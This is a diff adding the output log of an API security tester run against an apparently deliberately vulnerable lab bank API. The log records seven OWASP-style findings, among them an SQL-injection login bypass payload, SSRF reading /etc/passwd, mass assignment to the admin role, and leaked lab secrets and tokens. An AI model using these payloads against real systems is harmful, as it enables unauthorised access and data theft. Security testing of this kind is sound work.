@@ -1,0 +1,68 @@
+============================================================
+NationalBank Reserve — API Security Top 10 Tester
+============================================================
+
+============================================================
+API1: BOLA - Broken Object Level Authorization
+============================================================
+[*] Accessing /api/v1/user/1 (admin) and /api/v1/user/3 (bob) WITHOUT auth
+[*] User 1: {'id': 1, 'role': 'admin', 'username': 'admin'}
+[*] User 3: {'id': 3, 'role': 'user', 'username': 'bob'}
+[+] BOLA CONFIRMED! No authorization check between users
+
+============================================================
+API2: Broken Authentication
+============================================================
+[*] Accessing /api/v1/admin WITHOUT any token
+[*] Response: {'flag': 'FLAG{broken_auth}', 'message': 'Welcome admin'}
+[+] Broken Authentication CONFIRMED! Admin endpoint accessible without auth
+
+============================================================
+API3: Excessive Data Exposure
+============================================================
+[*] Checking /api/v1/users for sensitive fields
+[*] Passwords exposed: True
+[*] API keys exposed: True
+[+] Excessive Data Exposure CONFIRMED! Passwords + API keys leaked
+
+============================================================
+API5: Broken Function Level Authorization
+============================================================
+[*] Trying to register user with role=admin (Mass Assignment)
+[*] Response: {'message': 'registered', 'role': 'admin', 'username': 'attacker'}
+[+] Mass Assignment CONFIRMED! Attacker can self-assign admin role
+
+============================================================
+API7: SSRF - Server-Side Request Forgery
+============================================================
+[*] Testing SSRF: fetch internal file
+[*] Response snippet: {'content': 'root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/
+[+] SSRF CONFIRMED! Can read local files via /api/v1/fetch
+
+============================================================
+API8: SQL Injection via API
+============================================================
+[*] Testing SQLi: username=admin' OR '1'='1'--
+[*] Response: {'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.i6h32G0ijwpBmjWZjmzvtpPWe_6k_ogkOKzgcpF9vJ4', 'user': 'admin'}
+[+] API SQL Injection CONFIRMED! Bypassed login via SQLi
+
+============================================================
+API9: Improper Assets Management
+============================================================
+[*] Checking /api/v1/debug for sensitive data
+[*] Response: {'database': 'in-memory', 'secret_key': 'supersecret123', 'users_count': 3, 'version': '1.0.0'}
+[+] Improper Assets Management CONFIRMED! Debug endpoint leaks secret_key
+
+============================================================
+API SECURITY SUMMARY
+============================================================
+  [+] VULNERABLE: API1-BOLA
+  [+] VULNERABLE: API2-BrokenAuth
+  [+] VULNERABLE: API3-DataExposure
+  [+] VULNERABLE: API5-BFLA-MassAssignment
+  [+] VULNERABLE: API7-SSRF
+  [+] VULNERABLE: API8-SQLi
+  [+] VULNERABLE: API9-ImproperAssets
+
+Total API vulnerabilities: 7/7
+============================================================
